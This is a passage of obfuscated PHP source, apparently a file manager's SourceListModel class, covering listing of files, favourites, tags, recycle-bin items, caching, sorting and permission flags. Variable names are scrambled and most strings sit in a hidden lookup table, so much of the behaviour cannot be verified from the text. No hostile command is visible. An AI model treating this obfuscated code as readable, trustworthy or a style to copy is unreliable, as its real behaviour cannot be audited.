($‰İÖ¿Ù as $³€µ¬¢® => $§ó°Íâ) { if (is_array($§ó°Íâ)) { $§ó°Íâ = json_encode_force($§ó°Íâ); } $this->checkLength($§ó°Íâ, !1, $this->tableName . $÷ıÇÀÄ[4] . $†óáóÁ); $§ó°Íâ = self::textEncode($§ó°Íâ); $‰İÖ¿Ù = array($÷ıÇÀÄ[33] => $ˆüÄô×ø, $÷ıÇÀÄ[97] => $³€µ¬¢®, $÷ıÇÀÄ[453] => $§ó°Íâ); $Á½«à¯[] = $this->filterWhere($‰İÖ¿Ù); } if (!$Á½«à¯) { return !0; } $Çä€úéû = $this->cacheKey($÷ıÇÀÄ[479]); CacheLock::lock($Çä€úéû); $îÍ½Î° = $this->addAll($Á½«à¯, array(), !0); CacheLock::unlock($Çä€úéû); return $îÍ½Î°; } protected function optionDefault($—‰ø›ä = '') { return !1; } public function setDeep($ïãŠ“æ, $âµ© ª = false, $áÛØ€š· = '') { $ô°ƒùô­ = explode($_SERVER[ÅÄÇĞô][10], $ïãŠ“æ); $ñìşÜæ = $this->get(); array_set_value($ñìşÜæ, $ïãŠ“æ, $âµ© ª); $this->set($ô°ƒùô­[0], $ñìşÜæ[$ô°ƒùô­[0]], $áÛØ€š·); } public function remove($¤å‡á†¶, $ãËà® = '') { $ªøí×ğÃ =& $_SERVER[ÅÄÇĞô]; $this->cacheRemove($ãËà®); $ä´‰Ğ× = $this->filterWhere(array($ªøí×ğÃ[97] => $¤å‡á†¶, $ªøí×ğÃ[33] => $ãËà®)); if (is_null($¤å‡á†¶)) { unset($ä´‰Ğ×[$ªøí×ğÃ[97]]); } return $this->where($ä´‰Ğ×)->delete(); } public function cacheSet($­œ«§›ø, $´®ÏŒ…ô = false) { return Cache::set($this->cacheKey($­œ«§›ø), $´®ÏŒ…ô); } public function cacheGet($óâ¿›úæ) { return Cache::get($this->cacheKey($óâ¿›úæ)); } public function cacheRemove($òÍş²­²) { return Cache::remove($this->cacheKey($òÍş²­²)); } protected function filterWhere($Å„ğ®ƒ) { return $Å„ğ®ƒ; } protected function cacheKey($ôŸÜëäµ) { return $ôŸÜëäµ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\x72\143\145"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\141\x6d\x65" => "\x69\x6f\137\163\157\x75\162\143\145\137\155\145\x74\141", "\x6d\145\164\141\x46\x69\x65\154\x64" => "\163\157\165\162\x63\x65\111\x44"); protected $dataAuto = array(array("\x6d\x6f\144\151\x66\x79\x54\151\x6d\145", "\164\x69\155\145", "\x69\x6e\163\x65\162\x74", "\x66\x75\x6e\x63\x74\151\x6f\x6e"), array("\143\x72\x65\x61\164\x65\124\x69\x6d\145", "\164\151\x6d\x65", "\x69\x6e\163\x65\x72\x74", "\x66\x75\156\143\x74\151\x6f\x6e"), array("\166\x69\x65\167\x54\151\155\145", "\x74\x69\155\145", "\151\156\163\145\162\164", "\146\x75\x6e\143\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ğ½±¯û) { return $this->listSource(array($_SERVER[ÅÄÇĞô][480] => $ğ½±¯û)); } public function typeName($¦Öõ”êâ) { static $Ê©Şç– = array(self::TYPE_SYSTEM => "\163\171\x73\x74\145\155", self::TYPE_USER => "\165\163\x65\x72", self::TYPE_GROUP => "\x67\162\157\165\160"); return $Ê©Şç–[$¦Öõ”êâ . $_SERVER[ÅÄÇĞô][12]]; } public function sourceListInfo($È›†Úº™, $é„êÚ¥— = false) { $‹Çèä» =& $_SERVER[ÅÄÇĞô]; $È›†Úº™ = $È›†Úº™ ? $È›†Úº™ : array(); $È›†Úº™ = array_filter(array_unique($È›†Úº™)); if (!$È›†Úº™) { return array(); } $ƒ¡¾Ô˜ä = $this->where(array($‹Çèä»[194] => array($‹Çèä»[7], $È›†Úº™)))->select(); $this->_listDataApply($ƒ¡¾Ô˜ä, $é„êÚ¥—); return array_to_keyvalue($ƒ¡¾Ô˜ä, $‹Çèä»[194]); } public function pathInfoFilter(&$‚Í˜åÆà) { $ÒÌŞÉµĞ =& $_SERVER[ÅÄÇĞô]; static $æºóëÒ¡ = false; static $õèì”• = false; static $Û¦õéı = false; if (!$æºóëÒ¡) { $‘²÷¸Ï· = $ÒÌŞÉµĞ[481]; $‘²÷¸Ï· .= $ÒÌŞÉµĞ[482]; $‘²÷¸Ï· .= $ÒÌŞÉµĞ[483]; $š¨µíµÒ = $ÒÌŞÉµĞ[484]; $øƒ›ÊôË = explode($ÒÌŞÉµĞ[50], $š¨µíµÒ); $æºóëÒ¡ = explode($ÒÌŞÉµĞ[50], $‘²÷¸Ï·); $õèì”• = array(); foreach ($æºóëÒ¡ as $á¡Ìğ£‰) { if (in_array($á¡Ìğ£‰, $øƒ›ÊôË)) { continue; } $õèì”•[] = $á¡Ìğ£‰; } $Û¦õéı = explode($ÒÌŞÉµĞ[50], $ÒÌŞÉµĞ[485]); } foreach ($Û¦õéı as $áõØôš¹) { if (isset($‚Í˜åÆà[$áõØôš¹])) { $‚Í˜åÆà[$áõØôš¹] = intval($‚Í˜åÆà[$áõØôš¹]); } } $‚Í˜åÆà[$ÒÌŞÉµĞ[87]] = $ÒÌŞÉµĞ[486] . $‚Í˜åÆà[$ÒÌŞÉµĞ[194]] . $ÒÌŞÉµĞ[487]; $‚Í˜åÆà[$ÒÌŞÉµĞ[33]] = $‚Í˜åÆà[$ÒÌŞÉµĞ[488]] == 1 ? $ÒÌŞÉµĞ[78] : $ÒÌŞÉµĞ[233]; $‚Í˜åÆà[$ÒÌŞÉµĞ[191]] = $this->typeName($‚Í˜åÆà[$ÒÌŞÉµĞ[191]]); if ($‚Í˜åÆà[$ÒÌŞÉµĞ[488]] != 1) { $‚Í˜åÆà[$ÒÌŞÉµĞ[169]] = $‚Í˜åÆà[$ÒÌŞÉµĞ[489]]; unset($‚Í˜åÆà[$ÒÌŞÉµĞ[489]]); } $¬ÎàŒ Ù = $æºóëÒ¡; if (isset($‚Í˜åÆà[$ÒÌŞÉµĞ[490]]) && $‚Í˜åÆà[$ÒÌŞÉµĞ[490]][$ÒÌŞÉµĞ[491]] == -1) { $¬ÎàŒ Ù = $õèì”•; } $‚Í˜åÆà = array_field_key($‚Í˜åÆà, $¬ÎàŒ Ù); return $‚Í˜åÆà; } public function listUserFav() { $¯Ôü =& $_SERVER[ÅÄÇĞô]; $àôá´é€ = Model($¯Ôü[492])->listData(); $”Ø¬¢‘Ÿ = array_filter_by_field($àôá´é€, $¯Ôü[33], $¯Ôü[493]); $”Ø¬¢‘Ÿ = array_to_keyvalue($”Ø¬¢‘Ÿ, $¯Ôü[12], $¯Ôü[87]); if ($”Ø¬¢‘Ÿ) { $Óæ Å© = $this->listSource(array($¯Ôü[494] => array($¯Ôü[495], $”Ø¬¢‘Ÿ))); } $Óæ Å© = array_to_keyvalue($Óæ Å©[$¯Ôü[448]], $¯Ôü[194]); foreach ($àôá´é€ as &$ı©©‚‹) { $ı©©‚‹ = array($¯Ôü[496] => $ı©©‚‹[$¯Ôü[478]], $¯Ôü[497] => $ı©©‚‹[$¯Ôü[32]], $¯Ôü[498] => $ı©©‚‹[$¯Ôü[87]], $¯Ôü[499] => $ı©©‚‹[$¯Ôü[33]], $¯Ôü[500] => $ı©©‚‹[$¯Ôü[234]], $¯Ôü[501] => $ı©©‚‹[$¯Ôü[88]]); if ($ı©©‚‹[$¯Ôü[33]] == $¯Ôü[493] && $Óæ Å©[$ı©©‚‹[$¯Ôü[87]]]) { $ı©©‚‹[$¯Ôü[90]] = $Óæ Å©[$ı©©‚‹[$¯Ôü[87]]]; } } unset($ı©©‚‹); return $àôá´é€; } public function listUserTag($á’‹‘ö„) { $Ø¯‚ Øú =& $_SERVER[ÅÄÇĞô]; if ($á’‹‘ö„ && !is_array($á’‹‘ö„)) { $á’‹‘ö„ = array($á’‹‘ö„); } $Ç„ñƒë = Model($Ø¯‚ Øú[502])->listData(); $¸½ÆæÁ = array(); $â™öŒ¹Í = array(); foreach ($Ç„ñƒë as $…‰ßÃı) { $¼¹Ãîñè = $…‰ßÃı[$Ø¯‚ Øú[87]]; if (!$¼¹Ãîñè) { continue; } if (!isset($â™öŒ¹Í[$¼¹Ãîñè])) { $â™öŒ¹Í[$¼¹Ãîñè] = array(); } $â™öŒ¹Í[$¼¹Ãîñè][] = $…‰ßÃı[$Ø¯‚ Øú[503]]; $¸½ÆæÁ[$…‰ßÃı[$Ø¯‚ Øú[87]]] = $…‰ßÃı; } $½ŒºÏ = array(); $Õî’İê¡ = array(); $äòÕÅÖ = array(); foreach ($â™öŒ¹Í as $‹Ü¢„ËÚ => $Ç€Ö‡›) { $´ÇªÉÚ• = !0; if (!$á’‹‘ö„) { $½ŒºÏ[] = $‹Ü¢„ËÚ; continue; } foreach ($á’‹‘ö„ as $«Ç·Å§Ê) { if (!in_array($«Ç·Å§Ê, $Ç€Ö‡›)) { $´ÇªÉÚ• = !1; break; } } if (!$´ÇªÉÚ•) { continue; } if (!is_numeric($‹Ü¢„ËÚ)) { $Ì†Ò‡ÜĞ = $¸½ÆæÁ[$‹Ü¢„ËÚ]; $ÀâĞƒæŸ = array($Ø¯‚ Øú[32] => $Ì†Ò‡ÜĞ[$Ø¯‚ Øú[32]], $Ø¯‚ Øú[87] => $Ì†Ò‡ÜĞ[$Ø¯‚ Øú[87]], $Ø¯‚ Øú[33] => $Ì†Ò‡ÜĞ[$Ø¯‚ Øú[33]], $Ø¯‚ Øú[90] => array($Ø¯‚ Øú[504] => 1), $Ø¯‚ Øú[235] => !0); if ($Ì†Ò‡ÜĞ[$Ø¯‚ Øú[33]] == $Ø¯‚ Øú[233]) { $äòÕÅÖ[] = $ÀâĞƒæŸ; } if ($Ì†Ò‡ÜĞ[$Ø¯‚ Øú[33]] == $Ø¯‚ Øú[78]) { $Õî’İê¡[] = $ÀâĞƒæŸ; } continue; } $½ŒºÏ[] = $‹Ü¢„ËÚ; } if ($½ŒºÏ) { $ğ”éÙ×º = $this->listSource(array($Ø¯‚ Øú[494] => array($Ø¯‚ Øú[495], $½ŒºÏ))); } $ğ”éÙ×º = $ğ”éÙ×º ? $ğ”éÙ×º : array($Ø¯‚ Øú[85] => array(), $Ø¯‚ Øú[86] => array()); $ğ”éÙ×º[$Ø¯‚ Øú[85]] = array_merge($ğ”éÙ×º[$Ø¯‚ Øú[85]], $Õî’İê¡); $ğ”éÙ×º[$Ø¯‚ Øú[86]] = array_merge($ğ”éÙ×º[$Ø¯‚ Øú[86]], $äòÕÅÖ); if (isset($ğ”éÙ×º[$Ø¯‚ Øú[445]]) && count($½ŒºÏ) == $ğ”éÙ×º[$Ø¯‚ Øú[445]][$Ø¯‚ Øú[446]]) { return $ğ”éÙ×º; } $Ì£›âá° = array(); $ÑóüËÊé = array_to_keyvalue($ğ”éÙ×º[$Ø¯‚ Øú[85]], $Ø¯‚ Øú[12], $Ø¯‚ Øú[194]); $‘ñêÔ = array_to_keyvalue($ğ”éÙ×º[$Ø¯‚ Øú[86]], $Ø¯‚ Øú[12], $Ø¯‚ Øú[194]); $ë‘°›é = array_merge($‘ñêÔ, $ÑóüËÊé); foreach ($½ŒºÏ as $¼¹Ãîñè) { if (!in_array($¼¹Ãîñè, $ë‘°›é)) { $Ì£›âá°[] = $¼¹Ãîñè; } } if ($Ì£›âá°) { Model($Ø¯‚ Øú[505])->removeBySource($Ì£›âá°); } return $ğ”éÙ×º; } public function listUserRecycle() { $Ø«•ĞÃ =& $_SERVER[ÅÄÇĞô]; $™Ù×©ˆ¡ = Model($Ø«•ĞÃ[506])->listData(); if (!$™Ù×©ˆ¡) { return array(); } $ä³ü¤Ë‘ = array($Ø«•ĞÃ[494] => array($Ø«•ĞÃ[495], $™Ù×©ˆ¡), $Ø«•ĞÃ[507] => 1); return $this->listSource($ä³ü¤Ë‘); } public function listSource($üá‰æœÎ, $ŸÃ¯¯ä = 3000, $¨®Ê‚ªá = false) { $¹‹ëèÅ© =& $_SERVER[ÅÄÇĞô]; if (!isset($üá‰æœÎ[$¹‹ëèÅ©[508]])) { $üá‰æœÎ[$¹‹ëèÅ©[508]] = 0; } if (isset($üá‰æœÎ[$¹‹ëèÅ©[193]]) && $üá‰æœÎ[$¹‹ëèÅ©[193]] == $¹‹ëèÅ©[231]) { $üá‰æœÎ[$¹‹ëèÅ©[489]] = array($¹‹ëèÅ©[509], $¹‹ëèÅ©[12]); } $…ºò‹ï = $¹‹ëèÅ©[510]; $€ÀÕêâ¢ = $this->field($…ºò‹ï)->_makeOrder()->where($üá‰æœÎ)->selectPage($ŸÃ¯¯ä); $this->_listPageCheck($€ÀÕêâ¢, $…ºò‹ï, $üá‰æœÎ); $this->_listDataApply($€ÀÕêâ¢[$¹‹ëèÅ©[448]], $¨®Ê‚ªá); $this->_listMake($€ÀÕêâ¢); return $€ÀÕêâ¢; } private function _listPageCheck(&$½¡“‹·, $ëµØŒÚ¢, $Ä”“ªĞÔ) { $ıŠ°¤Ş¦ =& $_SERVER[ÅÄÇĞô]; if (!is_array($½¡“‹·[$ıŠ°¤Ş¦[445]])) { return; } $›úŞÖ®ù = $½¡“‹·[$ıŠ°¤Ş¦[445]]; if ($›úŞÖ®ù[$ıŠ°¤Ş¦[447]] <= 1) { return; } if ($›úŞÖ®ù[$ıŠ°¤Ş¦[446]] >= 100000) { return; } if (Model($ıŠ°¤Ş¦[511])->get($ıŠ°¤Ş¦[512]) != $ıŠ°¤Ş¦[513]) { return; } $ëµØŒÚ¢ = str_replace(array($ıŠ°¤Ş¦[53], $ıŠ°¤Ş¦[420], $ıŠ°¤Ş¦[288]), $ıŠ°¤Ş¦[12], $ëµØŒÚ¢); $ëµØŒÚ¢ = $ıŠ°¤Ş¦[514] . str_replace($ıŠ°¤Ş¦[50], $ıŠ°¤Ş¦[515], $ëµØŒÚ¢) . $ıŠ°¤Ş¦[516]; $ğ«²­ş‘ = $ıŠ°¤Ş¦[517]; $ğ«²­ş‘ = $ğ«²­ş‘ . $ıŠ°¤Ş¦[518]; $¡è€›ÔŸ = $›úŞÖ®ù[$ıŠ°¤Ş¦[442]] * ($›úŞÖ®ù[$ıŠ°¤Ş¦[431]] - 1) . $ıŠ°¤Ş¦[50] . $›úŞÖ®ù[$ıŠ°¤Ş¦[442]]; $Øœ”¨ ¸ = $this->_makeOrder(!0); $†Æ¨ó€ó = $ıŠ°¤Ş¦[514] . str_replace($ıŠ°¤Ş¦[50], $ıŠ°¤Ş¦[515], $Øœ”¨ ¸[0]); if (strpos($†Æ¨ó€ó, $ıŠ°¤Ş¦[519])) { $†Æ¨ó€ó = str_replace($ıŠ°¤Ş¦[519], $ıŠ°¤Ş¦[520], $†Æ¨ó€ó); } else { $†Æ¨ó€ó .= $ıŠ°¤Ş¦[521] . $Øœ”¨ ¸[1]; } $½ÕßŠ§ = array(); foreach ($Ä”“ªĞÔ as $šåŞÆ¤ => $¦óåğèÏ) { $½ÕßŠ§[$ıŠ°¤Ş¦[514] . $šåŞÆ¤] = $¦óåğèÏ; } $this->alias($ıŠ°¤Ş¦[522])->field($ëµØŒÚ¢)->limit($¡è€›ÔŸ)->order($†Æ¨ó€ó); $§Œƒ§½‘ = $this->join($ğ«²­ş‘)->where($½ÕßŠ§)->select(); if ($§Œƒ§½‘) { $½¡“‹·[$ıŠ°¤Ş¦[448]] = $§Œƒ§½‘; } } protected function _makeOrder($°Âú…Â = false) { $—¶†Ç™ =& $_SERVER[ÅÄÇĞô]; $€­‰Ïã» = Model($—¶†Ç™[523])->get($—¶†Ç™[524]); $¨Ñ´ÙÅ¯ = Model($—¶†Ç™[523])->get($—¶†Ç™[525]); $¤õ¦‰É¹ = array($—¶†Ç™[526] => $—¶†Ç™[527], $—¶†Ç™[528] => $—¶†Ç™[529]); $çÑÅ¥Â® = array($—¶†Ç™[32] => $—¶†Ç™[32], $—¶†Ç™[79] => $—¶†Ç™[79], $—¶†Ç™[169] => $—¶†Ç™[489], $—¶†Ç™[530] => $—¶†Ç™[530], $—¶†Ç™[531] => $—¶†Ç™[532], $—¶†Ç™[234] => $—¶†Ç™[234], $—¶†Ç™[88] => $—¶†Ç™[88]); $“àÎÜ½‚ = Input::get($—¶†Ç™[533], $—¶†Ç™[7], $€­‰Ïã», array_keys($çÑÅ¥Â®)); $Ÿúš†ÍÄ = Input::get($—¶†Ç™[534], $—¶†Ç™[7], $¨Ñ´ÙÅ¯, array_keys($¤õ¦‰É¹)); if (!in_array($“àÎÜ½‚, array_keys($çÑÅ¥Â®))) { $“àÎÜ½‚ = $—¶†Ç™[32]; } if (!in_array($Ÿúš†ÍÄ, array_keys($¤õ¦‰É¹))) { $“àÎÜ½‚ = $—¶†Ç™[526]; } if ($“àÎÜ½‚ == $—¶†Ç™[32]) { } $óï´Èº = $—¶†Ç™[535] . $çÑÅ¥Â®[$“àÎÜ½‚] . $—¶†Ç™[53] . $¤õ¦‰É¹[$Ÿúš†ÍÄ]; $óï´Èº = rtrim(trim($óï´Èº), $—¶†Ç™[50]); if ($°Âú…Â) { return array($óï´Èº, $¤õ¦‰É¹[$Ÿúš†ÍÄ]); } return $this->order($óï´Èº); } protected function _listDataApplyItem($»…úšÛ”, $¬á±¤—ã = false) { $Àá¿£Óš = array($»…úšÛ”); $this->_listDataApply($Àá¿£Óš, $¬á±¤—ã); return $Àá¿£Óš[0]; } protected function _listDataApply(&$”–îåÇŞ, $äüÀÖï = false) { $ş•ûæï¯ =& $_SERVER[ÅÄÇĞô]; if (!$”–îåÇŞ) { $”–îåÇŞ = array(); return; } $ÅüÁÈ¢ë = array_to_keyvalue($”–îåÇŞ, $ş•ûæï¯[12], $ş•ûæï¯[194]); $ÅüÁÈ¢ë = array_unique($ÅüÁÈ¢ë); $this->_listSourceCache($”–îåÇŞ); if (!$äüÀÖï) { $this->_listAppendMeta($”–îåÇŞ, $ÅüÁÈ¢ë); $this->_listAppendFileMeta($”–îåÇŞ, $ÅüÁÈ¢ë); $this->_listAppendChildren($”–îåÇŞ, $ÅüÁÈ¢ë); } $this->_listAppendPath($”–îåÇŞ); $this->_listAppendAuth($”–îåÇŞ); $this->_listAppendSourceInfo($”–îåÇŞ, $ÅüÁÈ¢ë); $this->_listAppendUser($”–îåÇŞ); $this->_listFilterInfo($”–îåÇŞ, $äüÀÖï); $this->_listAppendAuthSecret($”–îåÇŞ); } protected function _listSourceCache($¦á—‘¨Î) { $ãÃÅ·‰ñ =& $_SERVER[ÅÄÇĞô]; foreach ($¦á—‘¨Î as $‰‘‹Á÷) { self::$cacheSourceInfo[$ãÃÅ·‰ñ[536] . $‰‘‹Á÷[$ãÃÅ·‰ñ[194]]] = $‰‘‹Á÷; } } protected function _listFilterInfo(&$ƒØùÎú, $¦”‡Å†® = false) { $ÈœË§ÔÕ =& $_SERVER[ÅÄÇĞô]; foreach ($ƒØùÎú as &$—ß«®ª) { $—ß«®ª = $this->pathInfoFilter($—ß«®ª); self::$cachePathInfo[$ÈœË§ÔÕ[537] . intval($¦”‡Å†®) . $ÈœË§ÔÕ[465] . $—ß«®ª[$ÈœË§ÔÕ[194]]] = $—ß«®ª; } unset($—ß«®ª); } protected function _listMake(&$ÛŠº·­ä) { $¢¨¨¢»Â =& $_SERVER[ÅÄÇĞô]; $ÛŠº·­ä[$¢¨¨¢»Â[85]] = array(); $ÛŠº·­ä[$¢¨¨¢»Â[86]] = array(); foreach ($ÛŠº·­ä[$¢¨¨¢»Â[448]] as $‘íÖ¢â) { $°”¡©ëÅ = $‘íÖ¢â[$¢¨¨¢»Â[488]] == 1 ? $¢¨¨¢»Â[85] : $¢¨¨¢»Â[86]; $ÛŠº·­ä[$°”¡©ëÅ][] = $‘íÖ¢â; } unset($ÛŠº·­ä[$¢¨¨¢»Â[448]]); } protected function _listAppendMeta(&$ÅÑÅ÷ˆ, $ª€ğùåº) { $äáµÔ¸“ =& $_SERVER[ÅÄÇĞô]; $ÄÅñŒ±· = array($äáµÔ¸“[494] => array($äáµÔ¸“[495], $ª€ğùåº)); $±ÈÀˆã× = Model($äáµÔ¸“[538])->field($äáµÔ¸“[539])->where($ÄÅñŒ±·)->select(); if (!$±ÈÀˆã×) { return; } $—Ñú–ÄÖ = array($äáµÔ¸“[540], $äáµÔ¸“[541], $äáµÔ¸“[520]); $…êË»óõ = array(); foreach ($±ÈÀˆã× as $ğ²ãü›Ê) { if (!isset($…êË»óõ[$ğ²ãü›Ê[$äáµÔ¸“[194]]])) { $…êË»óõ[$ğ²ãü›Ê[$äáµÔ¸“[194]]] = array(); } if (in_array($ğ²ãü›Ê[$äáµÔ¸“[97]], $—Ñú–ÄÖ)) { continue; } if ($ğ²ãü›Ê[$äáµÔ¸“[97]] == $äáµÔ¸“[542]) { $ğ²ãü›Ê[$äáµÔ¸“[453]] = $äáµÔ¸“[543]; } $…êË»óõ[$ğ²ãü›Ê[$äáµÔ¸“[194]]][$ğ²ãü›Ê[$äáµÔ¸“[97]]] = $ğ²ãü›Ê[$äáµÔ¸“[453]]; } foreach ($ÅÑÅ÷ˆ as &$Æ¨®µİ) { $Æ¨®µİ[$äáµÔ¸“[544]] = !1; if (isset($…êË»óõ[$Æ¨®µİ[$äáµÔ¸“[194]]])) { $Æ¨®µİ[$äáµÔ¸“[544]] = $…êË»óõ[$Æ¨®µİ[$äáµÔ¸“[194]]]; } if ($this->fileIsLock($Æ¨®µİ) && $Æ¨®µİ[$äáµÔ¸“[490]]) { $„¾å„Úù = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Æ¨®µİ[$äáµÔ¸“[490]][$äáµÔ¸“[491]] = AuthModel::authDisable($Æ¨®µİ[$äáµÔ¸“[490]][$äáµÔ¸“[491]], $„¾å„Úù); $Æ¨®µİ[$äáµÔ¸“[490]][$äáµÔ¸“[545]][$äáµÔ¸“[490]] = $Æ¨®µİ[$äáµÔ¸“[490]][$äáµÔ¸“[491]]; } } unset($Æ¨®µİ); } protected function _listAppendFileMeta(&$Ú»¦—„ı, $…ÕïÇŠ) { $ÎØ¾ó§‰ =& $_SERVER[ÅÄÇĞô]; $Í¢š¨Õ = array_to_keyvalue($Ú»¦—„ı, $ÎØ¾ó§‰[12], $ÎØ¾ó§‰[546]); $Í¢š¨Õ = array_filter(array_unique($Í¢š¨Õ)); if (!$Í¢š¨Õ) { return; } $ÔÖœ•Ú = array($ÎØ¾ó§‰[547] => array($ÎØ¾ó§‰[495], $Í¢š¨Õ)); $Ó‰Ãœ°È = $ÎØ¾ó§‰[548]; $˜×È£ñ = Model($ÎØ¾ó§‰[549])->field($Ó‰Ãœ°È)->where($ÔÖœ•Ú)->select(); $˜×È£ñ = array_to_keyvalue($˜×È£ñ, $ÎØ¾ó§‰[546]); $ûœ­Ëëî = Model($ÎØ¾ó§‰[550])->field($ÎØ¾ó§‰[551])->where($ÔÖœ•Ú)->select(); $ûœ­Ëëî = $ûœ­Ëëî ? $ûœ­Ëëî : array(); $ÈÁêÌüÀ = array(); foreach ($ûœ­Ëëî as $³»…ú¶®) { if (!isset($ÈÁêÌüÀ[$³»…ú¶®[$ÎØ¾ó§‰[546]]])) { $ÈÁêÌüÀ[$³»…ú¶®[$ÎØ¾ó§‰[546]]] = array(); } $ÈÁêÌüÀ[$³»…ú¶®[$ÎØ¾ó§‰[546]]][$³»…ú¶®[$ÎØ¾ó§‰[97]]] = $³»…ú¶®[$ÎØ¾ó§‰[453]]; } foreach ($Ú»¦—„ı as &$‹ªƒ¢„ñ) { $±ÆÛâ = $‹ªƒ¢„ñ[$ÎØ¾ó§‰[546]]; if (!$±ÆÛâ || !is_array($˜×È£ñ[$±ÆÛâ])) { continue; } $±§«ÙôÙ = $˜×È£ñ[$±ÆÛâ]; $±§«ÙôÙ[$ÎØ¾ó§‰[79]] = $‹ªƒ¢„ñ[$ÎØ¾ó§‰[79]]; $±§«ÙôÙ[$ÎØ¾ó§‰[32]] = $‹ªƒ¢„ñ[$ÎØ¾ó§‰[32]]; if (!$±§«ÙôÙ[$ÎØ¾ó§‰[552]]) { Model($ÎØ¾ó§‰[549])->fileMd5Check($±§«ÙôÙ); } if (!isset(self::$cacheFileInfo[$ÎØ¾ó§‰[553] . $±ÆÛâ])) { self::$cacheFileInfo[$ÎØ¾ó§‰[553] . $±ÆÛâ] = array_merge(array(), $±§«ÙôÙ); } unset($˜×È£ñ[$±ÆÛâ][$ÎØ¾ó§‰[87]]); $Ì¦ü¤îê = isset($ÈÁêÌüÀ[$±ÆÛâ]) && is_array($ÈÁêÌüÀ[$±ÆÛâ]) ? $ÈÁêÌüÀ[$±ÆÛâ] : array(); $‹ªƒ¢„ñ[$ÎØ¾ó§‰[170]] = array_merge($Ì¦ü¤îê, $˜×È£ñ[$±ÆÛâ]); if (isset($‹ªƒ¢„ñ[$ÎØ¾ó§‰[170]][$ÎØ¾ó§‰[185]])) { $‹ªƒ¢„ñ[$ÎØ¾ó§‰[185]] = json_decode($‹ªƒ¢„ñ[$ÎØ¾ó§‰[170]][$ÎØ¾ó§‰[185]], !0); unset($‹ªƒ¢„ñ[$ÎØ¾ó§‰[170]][$ÎØ¾ó§‰[185]]); } } unset($‹ªƒ¢„ñ); } protected function _listAppendSourceInfo(&$“ğÜ™›¾, $ê¶†å¶) { $µĞ¯˜² =& $_SERVER[ÅÄÇĞô]; $ÇÇÙœŸ = Model($µĞ¯˜²[554])->listData(); $ˆ¡ÆúŸá = Model($µĞ¯˜²[502])->listData(); $À‘Ä¥í = Model($µĞ¯˜²[492])->listData(); $¬­›ç¤È = Model($µĞ¯˜²[555])->listSimple(); $ƒÎÊ…³ = array_to_keyvalue($ÇÇÙœŸ, $µĞ¯˜²[478]); $ŠÎı¢şß = array_to_keyvalue_group($ˆ¡ÆúŸá, $µĞ¯˜²[87], $µĞ¯˜²[503]); $í®¾„ÂØ = array_to_keyvalue($À‘Ä¥í, $µĞ¯˜²[87]); $«øäÛÍÕ = array_to_keyvalue_group($¬­›ç¤È, $µĞ¯˜²[194]); foreach ($“ğÜ™›¾ as &$÷ÉòŠëü) { $÷ÉòŠëü[$µĞ¯˜²[90]] = array($µĞ¯˜²[556] => 0, $µĞ¯˜²[557] => 0, $µĞ¯˜²[558] => 0); if (isset($í®¾„ÂØ[$÷ÉòŠëü[$µĞ¯˜²[194]]])) { $÷ÉòŠëü[$µĞ¯˜²[90]][$µĞ¯˜²[559]] = 1; $÷ÉòŠëü[$µĞ¯˜²[90]][$µĞ¯˜²[560]] = $í®¾„ÂØ[$÷ÉòŠëü[$µĞ¯˜²[194]]][$µĞ¯˜²[32]]; } if ($ŠÎı¢şß && $ƒÎÊ…³ && isset($ŠÎı¢şß[$÷ÉòŠëü[$µĞ¯˜²[194]]])) { $÷ÉòŠëü[$µĞ¯˜²[90]][$µĞ¯˜²[561]] = array(); foreach ($ŠÎı¢şß[$÷ÉòŠëü[$µĞ¯˜²[194]]] as $µ—æØ¥) { $€®ºÆÕÚ = $ƒÎÊ…³[$µ—æØ¥]; $÷ÉòŠëü[$µĞ¯˜²[90]][$µĞ¯˜²[561]][] = array($µĞ¯˜²[562] => $€®ºÆÕÚ[$µĞ¯˜²[478]], $µĞ¯˜²[497] => $€®ºÆÕÚ[$µĞ¯˜²[32]], $µĞ¯˜²[563] => $€®ºÆÕÚ[$µĞ¯˜²[564]]); } } if ($«øäÛÍÕ && isset($«øäÛÍÕ[$÷ÉòŠëü[$µĞ¯˜²[194]]])) { $÷ÉòŠëü[$µĞ¯˜²[90]][$µĞ¯˜²[565]] = array(); foreach ($«øäÛÍÕ[$÷ÉòŠëü[$µĞ¯˜²[194]]] as $µúÃÊƒû) { $•±¢Í´€ = $µĞ¯˜²[566]; if ($µúÃÊƒû[$µĞ¯˜²[567]] == $µĞ¯˜²[91]) { $•±¢Í´€ .= $µĞ¯˜²[568]; } $÷ÉòŠëü[$µĞ¯˜²[90]][$µĞ¯˜²[565]] = array_field_key($µúÃÊƒû, explode($µĞ¯˜²[50], $•±¢Í´€)); } } } unset($÷ÉòŠëü); return $“ğÜ™›¾; } protected function _listAppendChildren(&$ÍÍ¶¸—, $ä§—‹òé) { $”ŸÂ± =& $_SERVER[ÅÄÇĞô]; $³ô”Ê… = array(); $¨ÓÖÆÚ = array($”ŸÂ±[242] => 0, $”ŸÂ±[243] => 0); foreach ($ÍÍ¶¸— as &$Ã§‚“º©) { if (!$Ã§‚“º©[$”ŸÂ±[488]]) { continue; } $³ô”Ê…[] = $Ã§‚“º©[$”ŸÂ±[194]]; } unset($Ã§‚“º©); if (!$³ô”Ê…) { return; } $¯Éó÷¾¦ = array($”ŸÂ±[193] => array($”ŸÂ±[7], $³ô”Ê…), $”ŸÂ±[508] => 0); $»½Ü¸´ä = array($”ŸÂ±[193], $”ŸÂ±[488], $”ŸÂ±[569] => $”ŸÂ±[570]); $›‚Ö¼ùÇ = $this->field($»½Ü¸´ä)->where($¯Éó÷¾¦)->group($”ŸÂ±[571])->select(); $ìå©æ¬À = array(); foreach ($›‚Ö¼ùÇ as $ÏÒ¢È¼) { $¨Õ™¾ë = $ÏÒ¢È¼[$”ŸÂ±[193]]; $¡à‡¢ü = $ÏÒ¢È¼[$”ŸÂ±[488]] == $”ŸÂ±[91] ? $”ŸÂ±[243] : $”ŸÂ±[242]; if (!isset($ìå©æ¬À[$¨Õ™¾ë])) { $ìå©æ¬À[$¨Õ™¾ë] = array($”ŸÂ±[242] => 0, $”ŸÂ±[243] => 0); } $ìå©æ¬À[$¨Õ™¾ë][$¡à‡¢ü] += $ÏÒ¢È¼[$”ŸÂ±[570]]; } foreach ($ÍÍ¶¸— as 